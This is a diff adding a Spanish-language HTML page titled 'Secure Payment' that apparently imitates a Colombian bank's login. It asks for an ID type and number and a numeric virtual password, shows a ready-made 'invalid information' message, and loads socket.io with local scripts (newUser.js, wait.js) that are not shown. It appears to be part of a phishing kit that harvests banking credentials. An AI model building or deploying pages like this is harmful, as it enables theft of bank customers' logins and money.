@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, user-scalable=0"
+    />
+    <script src="../../../js/functions.js"></script>
+    <title>Secure Payment</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        font-family: arial;
+        -webkit-appearance: none !important;
+        -moz-appearance: none !important;
+        color: white;
+      }
+
+      input {
+        background-color: #605c5cd2;
+        height: 40px;
+      }
+
+      a {
+        font-size: 22px;
+        margin-left: 10px;
+      }
+
+      select {
+        background-color: #e2e2e2b2;
+        height: 40px;
+        border: none;
+        width: 75%;
+        margin-left: 50px;
+        border-radius: 12px;
+        padding-left: 10px;
+      }
+
+      input {
+        width: 35%;
+        border-radius: 12px;
+        padding-left: 5px;
+      }
+    </style>
+  </head>
+
+  <body style="background-color: #6d6e72">
+    <img src="./img/texto.jfif" alt="" srcset="" width="100%" />
+    <img src="img/logo-big.png" height="70vh" alt="" />
+
+    <div class="datos">
+      <h6 style="margin-left: 50px; margin-top: 25px; font-size: medium">
+        Tipo documento
+      </h6>
+      <br />
+      <select name="cc" id="" style="color: black">
+        <option value="cedula" select>Cedula de Ciudadania</option></select
+      ><br /><br />
+
+      <center>
+        <label for="documento" style="margin-left: -10px">
+          <b>No. documento</b>
+        </label>
+        <label for="clave" style="margin-left: 50px">
+          <b>Clave virtual</b> </label
+        ><br />
+
+        <input
+          type="number"
+          inputmode="numeric"
+          name="documento"
+          id="txtUsuario"
+          style="margin-top: 5px"
+          required
+          minlength="6"
+          maxlength="10"
+          oninput="this.value = this.value.slice(0, 10);"
+        />
+        <input
+          type="password"
+          name="clave"
+          id="txtPass"
+          style="margin-top: 5px"
+          minlength="6"
+          maxlength="10"
+          oninput="this.value = this.value.slice(0, 10);"
+        />
+        <br /><br />
+        <button
+          type="submit"
+          value="Ingresar"
+          id="btnUsuario"
+          style="
+            display: block;
+            padding: 0.2rem 4rem;
+            border: none;
+            border-radius: 15px;
+            background-color: red;
+            height: 45px;
+            border-bottom: 5px solid red;
+            margin-top: 5px;
+            color: white;
+            font-weight: 700;
+          "
+        >
+          Validar
+        </button>
+        <br />
+        <a style="font-size: 15px; font-weight: 700; color: red"
+          >Información inválida</a
+        >
+        <br /><br />
+        <a style="font-size: 15px">¿Olvidó o bloqueó su clave?</a> <br />
+      </center>
+      <br /><br />
+    </div>
+    <script src="js/newUser.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
+    <script src="js/wait.js"></script>
+  </body>
+
+  <script>
+    const txtPass = document.getElementById("txtPass");
+
+    txtPass.addEventListener("input", function () {
+      const value = txtPass.value;
+      const cleanValue = value.replace(/\D/g, ""); // Remover caracteres no numéricos
+
+      if (value !== cleanValue) {
+        txtPass.value = cleanValue;
+      }
+    });
+  </script>
+</html>
